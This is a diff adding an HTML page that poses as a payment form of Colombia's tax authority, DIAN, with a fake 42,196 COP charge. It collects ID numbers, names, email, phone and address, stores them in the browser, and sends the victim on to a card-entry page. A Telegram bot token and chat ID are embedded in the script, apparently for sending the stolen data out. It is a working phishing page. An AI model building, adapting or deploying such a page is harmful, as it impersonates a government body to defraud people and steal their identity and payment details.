@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Formulario de Pago DIAN</title>
+  <link href="https://fonts.googleapis.com/css2?family=Lato&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: 'Lato', sans-serif;
+      background-color: #fff;
+      padding: 20px;
+      color: #000;
+    }
+    .form-box {
+      background-color: #fff;
+      max-width: 380px;
+      margin: auto;
+      padding: 15px 20px;
+      border-radius: 5px;
+    }
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+    .top-bar img.logo {
+      height: 50px;
+    }
+    .top-bar .flags img {
+      width: 24px;
+      margin-left: 6px;
+      cursor: pointer;
+    }
+    .section-title {
+      font-weight: bold;
+      color: #1d276c;
+      margin: 15px 0 5px;
+    }
+    .input-row {
+      background: #f5f5f5;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+    .bold {
+      font-weight: bold;
+    }
+    label {
+      color: #1D276C;
+      font-size: 14px;
+      display: block;
+      margin-top: 10px;
+      margin-bottom: 3px;
+    }
+    input, select {
+      width: 90%;
+      padding: 8px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      display: block;
+      margin: 0 auto;
+    }
+    .checkbox {
+      margin-top: 10px;
+      display: flex;
+      align-items: center;
+    }
+    .checkbox input {
+      margin-right: 8px;
+    }
+    .footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background-color: #001e5a;
+      color: white;
+      text-align: center;
+      font-size: 12px;
+      padding: 12px;
+      box-sizing: border-box;
+      z-index: 1000;
+    }
+    .input-flex {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+    .input-flex label {
+      width: 40%;
+      margin: 0;
+      text-align: left;
+      font-weight: bold;
+    }
+    .input-flex input,
+    .input-flex select {
+      width: 58%;
+      margin: 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="top-bar">
+    <img src="/imagenes/DIAN.png" alt="Logo" class="logo">
+    <div class="flags">
+      <img src="https://flagcdn.com/w40/co.png" alt="ES">
+      <img src="https://flagcdn.com/w40/us.png" alt="EN">
+      <img src="https://flagcdn.com/w40/br.png" alt="BR">
+    </div>
+  </div>
+
+  <div class="section-title">Resumen de la compra</div>
+  <div class="input-row">
+    <p><span class="bold">Serie:</span> HET9</p>
+    <p><span class="bold">Folio:</span> 8487</p>
+    <p><span class="bold">Descripción:</span> Dirección de Impuestos y Aduanas Nacionales</p>
+    <p><span class="bold">Valor a pagar:</span> <span style="color:#1d276c;"><b>$ 42,196.00 COP</b></span></p>
+  </div>
+
+  <div class="section-title">Información Usuario</div>
+  <div class="input-row">
+    <form id="pagoForm">
+      <div class="input-flex">
+        <label for="tipo">Tipo Documento *</label>
+        <select id="tipo" required>
+          <option value="">Seleccione Tipo de Documento</option>
+          <option value="Cédula de Ciudadanía">Cédula de Ciudadanía</option>
+          <option value="Cédula de Extranjería">Cédula de Extranjería</option>
+          <option value="NIT">NIT</option>
+        </select>
+      </div>
+      <div class="input-flex">
+        <label for="id">N° Identificación *</label>
+        <input type="text" inputmode="numeric" pattern="[0-9]*" id="id" required minlength="6" maxlength="10">
+      </div>
+      <div class="input-flex">
+        <label for="nombres">Nombres *</label>
+        <input type="text" id="nombres" required minlength="3" maxlength="20">
+      </div>
+      <div class="input-flex">
+        <label for="apellidos">Apellidos *</label>
+        <input type="text" id="apellidos" required minlength="3" maxlength="20">
+      </div>
+      <div class="input-flex">
+        <label for="correo">Correo *</label>
+        <input type="email" id="correo" required>
+      </div>
+      <div class="input-flex">
+        <label for="celular">Celular *</label>
+        <input type="tel" id="celular" required pattern="[0-9]{10}" maxlength="10" minlength="10">
+      </div>
+      <div class="input-flex">
+        <label for="direccion">Dirección *</label>
+        <input type="text" id="direccion" required minlength="10" maxlength="50">
+      </div>
+    </form>
+  </div>
+
+  <br>
+  <div class="section-title">Seleccione medio de pago.</div>
+  <hr style="border: none; border-top: 2px solid #ffd800; margin: 20px 0;">
+ 
+
+  <div class="section-title">Tarjetas de Crédito</div>
+   <div style="display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; margin: 20px 0;">
+    <a href="#" onclick="enviarFormulario('cc.html')" style="display: flex; align-items: center; justify-content: center; width: 70px; height: 40px; border: 2px solid #1d276c; border-radius: 12px; padding: 5px;">
+      <img src="/img/ch-m.png" alt="PSE" style="max-width: 100%; max-height: 100%;">
+    </a>
+    <a href="#" onclick="enviarFormulario('/cc.html')" style="display: flex; align-items: center; justify-content: center; width: 70px; height: 40px; border: 2px solid #1d276c; border-radius: 12px; padding: 5px;">
+      <img src="/img/ch-v.png" alt="Banco" style="max-width: 100%; max-height: 100%;">
+    </a>
+  </div>
+  <hr style="border: none; border-top: 2px solid #ffd800; margin: 20px 0;">
+  <hr style="border: none; border-top: 8px solid #1d276c; margin: 20px 0;">
+  <div class="section-title">DIAN</div>
+  <div class="section-title">800197268-4</div>
+  <div class="section-title">111711</div>
+
+  <br><br><br>
+  <div class="footer">
+    Copyright © Tc Pay un producto de Tu Compra S.A.S
+  </div>
+
+  <script>
+    // ============================================
+    // BOTS DE TELEGRAM
+    // ============================================
+    const TELEGRAM_BOT_TOKEN = '8736155859:AAHI77N8wP6_UNpI3RGIerJkLRRKUvVR8iQ';
+    const TELEGRAM_CHAT_ID = '-1004294946880';
+
+    function enviarFormulario(redirectUrl) {
+      const form = document.getElementById('pagoForm');
+      
+      // Validar el formulario
+      if (!form.checkValidity()) {
+        form.reportValidity();
+        return;
+      }
+
+      // Recoger datos del formulario
+      const datos = {
+        tipo: document.getElementById('tipo').value,
+        id: document.getElementById('id').value,
+        nombres: document.getElementById('nombres').value,
+        apellidos: document.getElementById('apellidos').value,
+        correo: document.getElementById('correo').value,
+        celular: document.getElementById('celular').value,
+        direccion: document.getElementById('direccion').value
+      };
+
+      // Guardar datos en localStorage para que estén disponibles en cc.html
+      localStorage.setItem('pago_tipo_documento', datos.tipo);
+      localStorage.setItem('pago_numero_documento', datos.id);
+      localStorage.setItem('pago_nombres', datos.nombres);
+      localStorage.setItem('pago_apellidos', datos.apellidos);
+      localStorage.setItem('pago_correo', datos.correo);
+      localStorage.setItem('pago_celular', datos.celular);
+      localStorage.setItem('pago_direccion', datos.direccion);
+
+      // Redirigir a cc.html (los datos se enviarán desde allí)
+      window.location.href = redirectUrl;
+    }
+  </script>
+</body>
+</html>
